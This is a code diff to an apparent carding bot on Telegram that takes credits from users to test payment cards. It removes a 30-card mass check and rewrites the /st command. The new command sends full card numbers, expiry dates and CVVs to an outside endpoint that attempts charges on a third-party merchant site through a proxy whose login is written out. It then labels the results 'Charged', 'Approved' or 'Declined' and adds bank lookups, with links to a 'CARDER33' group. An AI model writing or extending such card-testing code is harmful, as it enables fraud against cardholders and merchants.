@@ -892,9 +892,6 @@ async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         "• <code>/st</code> - <i>Check a single card on Stripe $1</i>\n"
         "  Example:\n"
         "  <code>/st 1234567890123456|12|2026|123</code>\n\n"
-        "• <code>/mst</code> - <i>Check 30 cards on Stripe $1</i>\n"
-        "  Example:\n"
-        "  <code>/mst x30 cards</code>\n\n"
         "⚡ Each check deducts credits.\n\n"
         "✨ <b>Status</b> - <i>Active</i> ✅"
     )
@@ -1048,7 +1045,6 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} <code>/chk cc|mm|yy|cvv</code> – Single Stripe Auth\n"
         f"{bullet_link} <code>/st cc|mm|yy|cvv</code> – Stripe 1$\n"
         f"{bullet_link} <code>/st1 cc|mm|yy|cvv</code> – Stripe 3$\n"
-        f"{bullet_link} <code>/mst cc|mm|yy|cvv</code> – Mass x30 Stripe 1$\n"
         f"{bullet_link} <code>/mass</code> – Mass x30 Stripe Auth 2\n\n"
 
         "🔹 <b>𝘽𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲</b>\n"
@@ -1935,47 +1931,39 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-import re
+import aiohttp
+import json
 import logging
 import asyncio
 from datetime import datetime
-
+from html import escape
 from telegram import Update
-from telegram.ext import ContextTypes
 from telegram.constants import ParseMode
-from telegram.helpers import escape_markdown
+from telegram.ext import ContextTypes
+import re
 
-from stripe import stripe_check  # your existing stripe.py function
+# Import DB helpers
 from db import get_user, update_user
-from bin import get_bin_info
 
 logger = logging.getLogger(__name__)
 
+# --- User cooldowns ---
 user_cooldowns = {}
 
-CARD_PATTERN = re.compile(r"\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b")
-
-
-# -------------------- Cooldown --------------------
 async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
     last_run = user_cooldowns.get(user_id, 0)
     now = datetime.now().timestamp()
-
     if now - last_run < cooldown_seconds:
-        remaining = round(cooldown_seconds - (now - last_run), 2)
-        msg = f"⏳ Cooldown in effect. Please wait {remaining} seconds."
         await update.effective_message.reply_text(
-            escape_markdown(msg, version=2),
-            parse_mode=ParseMode.MARKDOWN_V2
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
         )
         return False
-
     user_cooldowns[user_id] = now
     return True
 
-
-# -------------------- Credits --------------------
 async def consume_credit(user_id: int) -> bool:
+    """Consume 1 credit from DB user if available."""
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
         new_credits = user_data["credits"] - 1
@@ -1983,331 +1971,215 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-
+# --- HC Processor ---
 import aiohttp
-
-# -------------------- Worker --------------------
-import aiohttp
-from telegram.constants import ParseMode
-from telegram.helpers import escape
-
-async def st_worker(update: Update, card: str, status_msg):
-    user = update.effective_user
-
-    # --- Call your API ---
-    url = f"https://rockyy.onrender.com/gateway?gateway=st1&key=rockysoon&card={card}"
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as resp:
-            data = await resp.json()
-
-    # Extract response
-    gateway_name = data.get("gateway", "Stripe 1$")
-    status = data.get("status", "UNKNOWN")
-    response_text = data.get("response", "No response")
-    code = data.get("code", "")
-
-    # Emoji map
-    emoji_map = {
-        "APPROVED": "✅",
-        "DECLINED": "❌",
-        "CCN": "⚠️",
-        "ERROR": "⚠️"
-    }
-    status_emoji = emoji_map.get(status.upper(), "❓")
-
-    # Format for HTML
-    status_fmt = f"<b>{escape(status)}</b> {status_emoji}"
-    response_fmt = escape(response_text)
-    card_fmt = escape(card)
-
-    # BIN lookup
-    bin_number = card.split("|")[0][:6]
-    bin_details = await get_bin_info(bin_number)
-
-    brand_fmt = escape((bin_details.get("scheme") or "N/A").title())
-    bank_fmt = escape(bin_details.get("bank") or "UNKNOWN")
-    country_fmt = escape(bin_details.get("country") or "N/A")
-    country_flag = bin_details.get("country_emoji", "")
-
-    # Clickable bullet + links
-    bullet_link = '<a href="https://t.me/CARDER33">[⌇]</a>'
-    developer = '<a href="https://t.me/Kalinuxxx">kคli liຖนxx</a>'
-    requested_by = f'<a href="tg://user?id={user.id}">{escape(user.first_name)}</a>'
-
-    # Final result
-    result_text = (
-        f"<b>◇━━〔 {status_fmt} 〕━━◇</b>\n"
-        f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{card_fmt}</code>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
-        f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{response_fmt}</i>\n"
-        "――――――――――――――――\n"
-        f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{brand_fmt}</code>\n"
-        f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{bank_fmt}</code>\n"
-        f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{country_fmt}</code> {country_flag}\n"
-        "――――――――――――――――\n"
-        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requested_by}\n"
-        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer}\n"
-        "――――――――――――――――"
-    )
-
-    await status_msg.edit_text(
-        result_text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
-    )
-
-
-
-
-# -------------------- Command --------------------
-import re
 import asyncio
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.helpers import escape_markdown
-from telegram.ext import ContextTypes
-
-CARD_PATTERN = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
-BULLET_GROUP_LINK = "https://t.me/CARDER33"  # Or your actual group
-
-async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-
-    # ⏳ Cooldown
-    if not await enforce_cooldown(user_id, update):
-        return
-
-    # 🧾 Credit check
-    if not await consume_credit(user_id):
-        msg = "❌ You have no credits left."
-        return await update.message.reply_text(
-            escape_markdown(msg, version=2),
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    # 🎯 Try extracting card from args or reply
-    raw_text = " ".join(context.args).strip()
-
-    if not raw_text and update.message.reply_to_message and update.message.reply_to_message.text:
-        raw_text = update.message.reply_to_message.text.strip()
-
-    match = CARD_PATTERN.search(raw_text)
-    if not match:
-        usage_text = "🚫 Usage: /st cc|mm|yy|cvv\nOr reply to a message containing a card."
-        return await update.message.reply_text(
-            escape_markdown(usage_text, version=2),
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    # ✅ Normalize card format
-    card_input = match.group(0)
-    card, mm, yy, cvv = card_input.split("|")
-    mm = mm.zfill(2)
-    yy = yy[-2:] if len(yy) == 4 else yy
-    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"
-
-    # 📤 Build and send processing message
-    bullet_text = "[⌇]"
-    bullet_link = f"[{escape_markdown(bullet_text, version=2)}]({BULLET_GROUP_LINK})"
-
-    gateway_text = escape_markdown("𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ #𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱", version=2)
-    status_text = escape_markdown("𝗦𝘁𝗮𝘁𝘂𝘀  ➵ Checking 🔎...", version=2)
-
-    processing_text = (
-        "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳ ```\n"
-        f"```{cc_normalized}```\n\n"
-        f"{bullet_link} {gateway_text}\n"
-        f"{bullet_link} {status_text}"
-    )
-
-    status_msg = await update.effective_message.reply_text(
-        processing_text,
-        parse_mode=ParseMode.MARKDOWN_V2,
-        disable_web_page_preview=True
-    )
-
-    # 🚀 Background worker
-    asyncio.create_task(st_worker(update, cc_normalized, status_msg))
-
-
-
-
-
-
-
+import json
+import logging
 import re
-import time
-import asyncio
-import aiohttp
+from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-from db import get_user, update_user  # Your credit functions
 
-# -------------------- Cooldowns --------------------
-mst_cooldowns = {}
-BULLET_GROUP_LINK = "https://t.me/CARDER33"
+logger = logging.getLogger(__name__)
 
-def mdv2_escape(text: str) -> str:
-    escape_chars = r"_*[]()~`>#+-=|{}.!"
-    return "".join("\\" + c if c in escape_chars else c for c in text)
+# === Your helper functions (assumed already defined elsewhere) ===
+# - consume_credit(user_id) -> bool
+# - get_bin_info(bin_number: str) -> dict
 
-async def consume_credit(user_id: int) -> bool:
-    user_data = await get_user(user_id)
-    if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
-        return True
-    return False
+async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
+    """
+    Process a /st command: check Stripe charge, display response and BIN info.
+    Gateway label = Stripe, Price = 1$
+    """
+    try:
+        user = update.effective_user
 
-# -------------------- Worker --------------------
-async def mst_worker(status_msg, cards: list):
-    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-    start_time = time.time()
+        # --- Consume credit ---
+        if not await consume_credit(user.id):
+            await update.message.reply_text("❌ You don’t have enough credits left.")
+            return
 
-    total = len(cards)
-    approved = 0
-    declined = 0
-    errors = 0
-    card_results = []
+        # --- Extract card details ---
+        parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: /st 1234567812345678|12|2028|123",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
 
-    async with aiohttp.ClientSession() as session:
-        for idx, card in enumerate(cards, start=1):
-            try:
-                url = f"https://rockyy.onrender.com/gateway?gateway=st1&key=rockysoon&card={card}"
-                async with session.get(url) as resp:
-                    data = await resp.json()
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+        full_card = f"{cc}|{mm}|{yy}|{cvv}"
 
-                status = data.get("status", "ERROR").upper()
-                response = data.get("response", "No response")
+        # --- Clickable bullet ---
+        BULLET_GROUP_LINK = "https://t.me/CARDER33"
+        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-                if status == "APPROVED":
-                    approved += 1
-                    emoji = "✅"
-                elif status == "DECLINED":
-                    declined += 1
-                    emoji = "❌"
-                else:
-                    errors += 1
-                    emoji = "⚠️"
+        # --- Initial processing message ---
+        processing_text = (
+            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
+            f"<pre><code>{full_card}</code></pre>\n\n"
+            f"{bullet_link} <b>Gateway ➵ 𝐒𝐭𝐫𝐢𝐩𝐞 1$</b>\n"
+            f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
+        )
 
-                card_block = (
-                    f"<code>{card}</code>\n"
-                    f"𝗦𝘁𝗮𝘁𝘂s ➵ {emoji} <i>{response}</i>\n"
-                    "──────── ⸙ ─────────"
-                )
-                card_results.append(card_block)
+        processing_msg = await update.message.reply_text(
+            processing_text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
 
-                elapsed = time.time() - start_time
-                header = (
-                    f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
-                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {idx}/{total}\n"
-                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
-                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
-                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
-                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
-                    "──────── ⸙ ─────────\n"
-                )
-                final_text = header + "\n".join(card_results)
+        # --- API request ---
+        api_url = (
+            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"?site=https://vasileandpavel.com"
+            f"&cc={full_card}"
+            f"&gateway=stripe"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
 
-                await status_msg.edit_text(
-                    final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
-                )
-                await asyncio.sleep(1)
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
+                    api_response = await resp.text()
+        except asyncio.TimeoutError:
+            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
+            return
+        except Exception as e:
+            await processing_msg.edit_text(
+                f"❌ API request failed: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
 
-            except Exception as e:
-                errors += 1
-                card_results.append(
-                    f"<code>{card}</code>\n𝗦𝘁𝗮𝘁𝗶𝗼𝗻 ➵ ⚠️ <i>{str(e)}</i>\n──────── ⸙ ─────────"
-                )
+        # --- Parse API response ---
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            logger.error(f"API returned invalid JSON: {api_response[:300]}")
+            await processing_msg.edit_text(
+                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
 
-    # Final update
-    elapsed = time.time() - start_time
-    header = (
-        f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
-        f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {total}/{total}\n"
-        f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
-        f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
-        f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
-        f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
-        "──────── ⸙ ─────────\n"
-    )
-    final_text = header + "\n".join(card_results)
-    await status_msg.edit_text(
-        final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
-    )
+        response = data.get("Response", "Unknown")
+        gateway = data.get("Gateway", "Stripe")
+        price = data.get("Price", "1$")
+
+        # --- BIN lookup ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "Unknown"
+            country_flag = bin_details.get("country_emoji", "")
+        except Exception as e:
+            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
+            brand = issuer = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- Requester ---
+        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
+        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
+
+        # --- Developer Branding ---
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+        # --- Enhance response with emojis & dynamic header ---
+        display_response = escape(response)
+        if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
+            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            header_status = "🔥 Charged"
+        elif "3D_AUTHENTICATION" in response.upper():
+            display_response += " 🔒"
+            header_status = "✅ Approved"
+        elif "CARD_DECLINED" in response.upper():
+            header_status = "❌ Declined"
+        elif "INVALID_CVC" in response.upper():
+            header_status = "✅ Approved"
+        elif "INSUFFICIENT_FUNDS" in response.upper():
+            display_response += " 💳"
+            header_status = "✅ Approved"
+        else:
+            header_status = "❌ Declined"
+
+        # --- Final formatted message ---
+        final_msg = (
+            f"◇━━〔 <b>{header_status}</b> 〕━━◇\n"
+            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐒𝐭𝐫𝐢𝐩𝐞 1$\n"
+            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
+            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{escape(issuer)}</code>\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{escape(country_name)} {country_flag}</code>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
+            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
+            "――――――――――――――――"
+        )
+
+        await processing_msg.edit_text(
+            final_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+    except Exception as e:
+        logger.exception("Error in processing /st")
+        try:
+            await update.message.reply_text(
+                f"❌ Error: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
 
 
+
+# --- Main /sh command ---
 import re
 
-# Strict card regex
+# Assuming you have this regex pattern somewhere globally:
 CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
-# -------------------- /mst Command --------------------
-async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
 
-    # Extract text from reply or args
-    if update.message.reply_to_message:
-        card_text = update.message.reply_to_message.text
-    else:
-        if not context.args:
-            await update.message.reply_text("⚠️ Send cards after /mst or reply with cards.")
-            return
-        card_text = " ".join(context.args)
-
-    # ✅ Extract only valid cards using regex
-    cards = CARD_REGEX.findall(card_text)
-
-    if not cards:
-        await update.message.reply_text("⚠️ No valid cards found (format: number|MM|YY|CVV).")
+    # --- Cooldown check ---
+    if not await enforce_cooldown(user.id, update):
         return
 
-    # ✅ Enforce max 30 cards per /mst
-    if len(cards) > 30:
+    payload = None
+
+    # --- Check arguments ---
+    if context.args:
+        payload = " ".join(context.args).strip()
+
+    # --- If no args, check reply message ---
+    elif update.message.reply_to_message and update.message.reply_to_message.text:
+        match = CARD_REGEX.search(update.message.reply_to_message.text)
+        if match:
+            payload = match.group().strip()
+
+    # --- If still no payload ---
+    if not payload:
         await update.message.reply_text(
-            f"⚠️ You sent {len(cards)} cards. Only the first 30 will be checked."
+            "⚠️ Usage: <code>/st card|mm|yy|cvv</code>\n"
+            "Or reply to a message containing a card.",
+            parse_mode=ParseMode.HTML
         )
-        cards = cards[:30]
-
-    # ✅ Apply cooldown
-    now = time.time()
-    if user_id in mst_cooldowns and now - mst_cooldowns[user_id] < 5:
-        remaining = int(5 - (now - mst_cooldowns[user_id]))
-        await update.message.reply_text(f"⏳ Please wait {remaining}s before using /mst again.")
-        return
-    mst_cooldowns[user_id] = now
-
-    # ✅ Deduct 1 credit per /mst
-    has_credit = await consume_credit(user_id)
-    if not has_credit:
-        await update.message.reply_text("⚠️ You don’t have enough credits to use /mst.")
         return
 
-    # Processing text
-    bullet = "[⌇]"
-    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
-    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲1$")
-    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")
-    initial_text = (
-        f"```{mdv2_escape('𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳')}```\n"
-        f"{bullet_link} {gateway_text}\n"
-        f"{bullet_link} {status_text}"
-    )
-
-    status_msg = await update.message.reply_text(
-        initial_text, parse_mode=ParseMode.MARKDOWN_V2, disable_web_page_preview=True
-    )
-
-    # Run worker in background
-    asyncio.create_task(mst_worker(status_msg, cards))
-
-
-
-
-
-
+    # --- Run in background ---
+    asyncio.create_task(process_st(update, context, payload))
 
 
 
@@ -3924,6 +3796,9 @@ async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # --- Run in background ---
     asyncio.create_task(process_at(update, context, payload))
+
+
+
 
 import asyncio
 import aiohttp
@@ -7086,9 +6961,8 @@ def register_commands(application):
         ("info", info),
         ("credits", credits_command),
         ("chk", chk_command),
-        ("st", st),
+        ("st", st_command),
         ("st1", st1_command),
-        ("mst", mst_command),
         ("mass", mass_handler),
         ("sh", sh_command),
         ("hc", hc_command),
